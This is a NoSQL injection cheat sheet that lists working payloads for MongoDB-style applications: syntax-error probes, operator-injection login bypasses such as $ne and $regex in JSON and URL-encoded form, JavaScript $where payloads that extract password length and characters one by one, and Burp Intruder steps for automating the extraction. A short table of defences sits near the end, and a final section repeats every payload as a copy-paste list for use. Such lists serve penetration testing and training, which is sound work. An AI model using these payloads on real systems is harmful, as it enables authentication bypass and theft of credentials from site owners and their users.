# NOSQL INJECTION PAYLOADS COMPLETE CHEAT SHEET

## 1. WHAT IS NOSQL INJECTION?

NoSQL injection occurs when an application fails to properly sanitize user input that is used in a NoSQL database query. Unlike SQL injection, NoSQL injection can take two main forms:

- **Operator Injection**: Injecting NoSQL query operators (e.g., `$ne`, `$gt`, `$regex`) into JSON or URL-encoded parameters.
- **JavaScript Injection**: Injecting JavaScript code into queries that use server-side JavaScript evaluation (e.g., MongoDB's `$where` operator).

Both can lead to authentication bypass, data extraction, and in some cases, remote code execution.

---

## 2. TYPES OF NOSQL INJECTION

| Type | Description | Example |
|------|-------------|---------|
| **Operator Injection** | Injecting operators like `$ne`, `$gt`, `$regex` into parameters. | `{"username":{"$ne":null},"password":{"$ne":null}}` |
| **JavaScript Injection** | Injecting JavaScript into `$where` or `mapReduce` queries. | `' && this.password.length < 30 || 'a'=='b` |
| **Syntax Error** | Injecting special characters to cause errors and reveal vulnerabilities. | `'`, `"`, `\`, `;` |

---

## 3. DETECTION PAYLOADS

### 3.1 Basic Syntax Error Probes
Inject these characters to see if they cause errors or abnormal responses.

```
'
"
\
;
{
}
[
]
(
)
&&
||
//
/*
*/
```

### 3.2 String Concatenation
Test if input is concatenated into a JavaScript string.

```
wiener'+'
Gifts'+'
admin'+'
```

### 3.3 Boolean Conditions
Test if you can inject boolean expressions that change the response.

**True condition:**
```
wiener' && '1'=='1
Gifts' && 1 && 'x
Gifts'||1||'
wiener' || '1'=='1
```

**False condition:**
```
wiener' && '1'=='2
Gifts' && 0 && 'x
wiener' || '1'=='2
```

### 3.4 Always True / Always False
```
'||1||'
'&&0&&'
'||'1'=='1'||'
'&&'1'=='2'&&'
```

---

## 4. AUTHENTICATION BYPASS PAYLOADS (OPERATOR INJECTION)

These payloads are typically sent as JSON or URL-encoded form data. They abuse MongoDB operators to bypass login.

### 4.1 JSON Payloads
```
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$ne":""},"password":{"$ne":""}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":"admin","password":{"$ne":"wrong"}}
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
{"username":{"$regex":"^admin"},"password":{"$ne":""}}
{"username":{"$in":["admin","administrator"]},"password":{"$ne":""}}
{"username":{"$exists":true},"password":{"$exists":true}}
```

### 4.2 URL-Encoded Payloads
```
username[$ne]=null&password[$ne]=null
username[$gt]=&password[$gt]=
username=admin&password[$ne]=wrong
username[$regex]=admin.*&password[$ne]=
```

### 4.3 Array Injection
```
username[$in][]=admin&username[$in][]=administrator&password[$ne]=
```

---

## 5. BLIND DATA EXTRACTION (JAVASCRIPT INJECTION)

When the application uses `$where` with string concatenation, you can inject JavaScript to extract data.

### 5.1 Password Length Enumeration
```
administrator' && this.password.length < 30 || 'a'=='b
administrator' && this.password.length < 10 || 'a'=='b
administrator' && this.password.length < 8 || 'a'=='b
administrator' && this.password.length > 5 || 'a'=='b
administrator' && this.password.length == 8 || 'a'=='b
```

### 5.2 Character Extraction (Position by Position)
```
administrator' && this.password[0]=='a
administrator' && this.password[0]=='b
administrator' && this.password[1]=='a
administrator' && this.password[2]=='a
...
administrator' && this.password[7]=='z
```

### 5.3 Using `substring` and `charAt`
```
administrator' && this.password.substring(0,1)=='a
administrator' && this.password.charAt(0)=='a
```

### 5.4 Using Regular Expressions
```
administrator' && /^a/.test(this.password) || 'a'=='b
administrator' && this.password.match(/^a/) != null || 'a'=='b
administrator' && this.password.match(/^ab/) != null || 'a'=='b
```

### 5.5 Extracting Other Fields
```
administrator' && this.username=='admin
administrator' && this.role=='admin
administrator' && this.email=='admin@example.com
```

### 5.6 Boolean-Based Data Extraction (True/False)
```
administrator' && this.password[0]=='a' || 'a'=='b
administrator' && this.password[0]=='b' || 'a'=='b
```

---

## 6. AUTOMATION WITH BURP INTRUDER

To extract a password character by character:

1. Send the request to Intruder.
2. Set payload position for the character index and the character value.
   Example: `administrator' && this.password[§0§]=='§a§`
3. Attack type: **Cluster bomb**.
4. Payload 1: numbers 0 to 7 (or password length - 1).
5. Payload 2: a-z, 0-9, special characters.
6. Start attack.
7. Sort by payload 1, then length. The request with a different length (or status) indicates a correct character.

---

## 7. TOOLS

| Tool | Usage |
|------|-------|
| **Burp Suite** | Manual testing, Intruder for automation. |
| **NoSQLMap** | Automated NoSQL injection and exploitation. |
| **nosql-injection** (GitHub) | Collection of payloads and scripts. |
| **MongoDB Compass** | Local testing of queries. |
| **jq** | JSON manipulation for payload crafting. |

---

## 8. DEFENSE / PREVENTION

| Rule | Explanation |
|------|-------------|
| **1. Avoid `$where`** | Use `$eq`, `$regex` with proper escaping instead. |
| **2. Sanitize input** | Never concatenate user input into queries. |
| **3. Use parameterized queries** | Use MongoDB's built-in query builders. |
| **4. Validate types** | Ensure input is a string, not an object with operators. |
| **5. Whitelist operators** | Only allow specific operators if necessary. |
| **6. Use ORM/ODM** | Mongoose, etc., can help prevent injection. |
| **7. Least privilege** | Database user should not have admin rights. |
| **8. Monitor queries** | Detect unusual query patterns. |
| **9. Update MongoDB** | Newer versions have better security defaults. |
| **10. Disable `$where`** | If not needed, disable it in MongoDB. |

---

## 9. ALL IN ONE JUST FOR COPY PASTE AND USE IN A TXT FILE

```
'
"
\
;
{
}
[
]
(
)
&&
||
//
/*
*/
wiener'+'
Gifts'+'
admin'+'
wiener' && '1'=='1
Gifts' && 1 && 'x
Gifts'||1||'
wiener' || '1'=='1
wiener' && '1'=='2
Gifts' && 0 && 'x
wiener' || '1'=='2
'||1||'
'&&0&&'
'||'1'=='1'||'
'&&'1'=='2'&&'
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$ne":""},"password":{"$ne":""}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":"admin","password":{"$ne":"wrong"}}
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
{"username":{"$regex":"^admin"},"password":{"$ne":""}}
{"username":{"$in":["admin","administrator"]},"password":{"$ne":""}}
{"username":{"$exists":true},"password":{"$exists":true}}
username[$ne]=null&password[$ne]=null
username[$gt]=&password[$gt]=
username=admin&password[$ne]=wrong
username[$regex]=admin.*&password[$ne]=
username[$in][]=admin&username[$in][]=administrator&password[$ne]=
administrator' && this.password.length < 30 || 'a'=='b
administrator' && this.password.length < 10 || 'a'=='b
administrator' && this.password.length < 8 || 'a'=='b
administrator' && this.password.length > 5 || 'a'=='b
administrator' && this.password.length == 8 || 'a'=='b
administrator' && this.password[0]=='a
administrator' && this.password[0]=='b
administrator' && this.password[1]=='a
administrator' && this.password[2]=='a
administrator' && this.password[7]=='z
administrator' && this.password.substring(0,1)=='a
administrator' && this.password.charAt(0)=='a
administrator' && /^a/.test(this.password) || 'a'=='b
administrator' && this.password.match(/^a/) != null || 'a'=='b
administrator' && this.password.match(/^ab/) != null || 'a'=='b
administrator' && this.username=='admin
administrator' && this.role=='admin
administrator' && this.email=='admin@example.com
administrator' && this.password[0]=='a' || 'a'=='b
administrator' && this.password[0]=='b' || 'a'=='b
```
